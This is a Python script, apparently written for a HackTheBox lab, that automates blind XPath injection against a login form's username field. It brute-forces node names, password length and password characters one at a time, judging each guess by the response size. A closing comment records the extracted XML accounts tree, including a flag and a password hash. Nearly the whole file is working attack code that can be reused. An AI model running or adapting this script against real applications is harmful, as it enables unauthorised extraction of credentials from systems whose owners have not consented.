#Script 2 - Responsável por encontrar quanto child (2), tamanho e seus nomes

import requests
from rich import print #Cores no print
import sys
from bs4 import BeautifulSoup #Parsing de HTML
import string

requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

url = "http://83.136.251.168:47586/index.php"

for x in range(0, 100):
	# valor = f"admin' and string-length(name(//*))={x} and '1'='1" Encontra a quantidade de letras no nome do primeiro node
	# valor = f"admin' and string-length(name(//*[1]/*[1]))={x} and '1'='1" Encontra a quantidade de letras no nome do node child
	# OBS: AZER ISSO ATE ENCONTRAR A SEGUINTE ARVORE:
	# <accounts>
	#         <acc>
	#                 <username>
	#                 </username>
	#                 <password>
	#                 </password>
	#         </acc>
	#         <acc>
	#                 <username>
	#                 </username>
	#                 <password>
	#                 </password>
	#         </acc>
	# </accounts>
	# OBS: UMA VEZ COM A ARVORE DE NODES, PEGAR AS INFORMACOES DO USERNAME E PASSWORD.
	# OBS2: REMOVER A TAG "NAME()" POIS ELA USADA APENAS PARA NODES.

	valor = f"admin' and string-length(//*[1]/*[1]/*[2])={x} and '1'='1" #Extrai o tamanho da senha
	data = {
		'username': valor,
		'msg': "123"
	}
	response = requests.post(url, data=data, headers=headers, proxies=proxies)
	html_response = response.text # Salva a response em uma variável
	soup = BeautifulSoup(html_response, 'html.parser') # Faz o parsing da response salva
	results_tag = soup.find_all('script') # Filtra pela tag HTML "script"

	for result in results_tag: #Usado para pega apenas o alert
		tam = (len(result.text)) # Armazena o tamanho da resposta
		print(f"\n[bold yellow][+]--> Test with {valor} <--[+][/bold yellow]\n") # Printa o valor utilizado no loop

	if tam == 30:
		print(f"\n[bold red]Error![/bold red]\n")
	else:
		print(f"\n[bold green]Success[/bold green]\n")
		print(f"\n[bold green]Correct Number: {x}[/bold green]\n")
		print(f"\n[bold green]Extracting name...[/bold green]\n")
		i = x + 1
		name = ''
		for a in range(1, i):
			printables = string.printable
			for char in printables:
				# valor = f"admin' and substring(name(//*[1]),{a},1)='{char}' and '1'='1" Encontra o nome do primeiro node
				# valor = f"admin' and substring(name(//*[1]/*[1]),{a},1)='{char}' and '1'='1" Encontra o nome do node child
				# OBS: AZER ISSO ATE ENCONTRAR A SEGUINTE ARVORE:
				# <accounts>
				#         <acc>
				#                 <username>
				#                 </username>
				#                 <password>
				#                 </password>
				#         </acc>
				#         <acc>
				#                 <username>
				#                 </username>
				#                 <password>
				#                 </password>
				#         </acc>
				# </accounts>
				# OBS: UMA VEZ COM A ARVORE DE NODES, PEGAR AS INFORMACOES DO USERNAME E PASSWORD.
				# OBS2: REMOVER A TAG "NAME()" POIS ELA USADA APENAS PARA NODES.

				valor = f"admin' and substring(//*[1]/*[1]/*[2],{a},1)='{char}' and '1'='1" #Extrai a senha
				data = {
					'username': valor,
					'msg': '123'
					}
				response = requests.post(url, data=data, headers=headers, proxies=proxies)
				html_response = response.text # Salva a response em uma variável
				soup = BeautifulSoup(html_response, 'html.parser') # Faz o parsing da response salva
				results_tag = soup.find_all('script') # Filtra pela tag HTML "script"

				for result in results_tag: #Usado para pega apenas o alert
					tam = (len(result.text)) # Armazena o tamanho da resposta

				if tam == 36:
					name += char
					print (name)
					break
		break

# Tree
# <accounts>
#         <acc>
#                 <username>
#                         admin
#                 </username>
#                 <password>
#                         HTB?bcc3b42debd91b5612aa80b1742f3aef?
#                 </password>
#         </acc>
#         <acc>
#                 <username>
#                         htb-stdnt
#                 </username>
#                 <password>
#                         295362c2618a05ba3899904a6a3f5bc0
#                 </password>
#         </acc>
# </accounts>
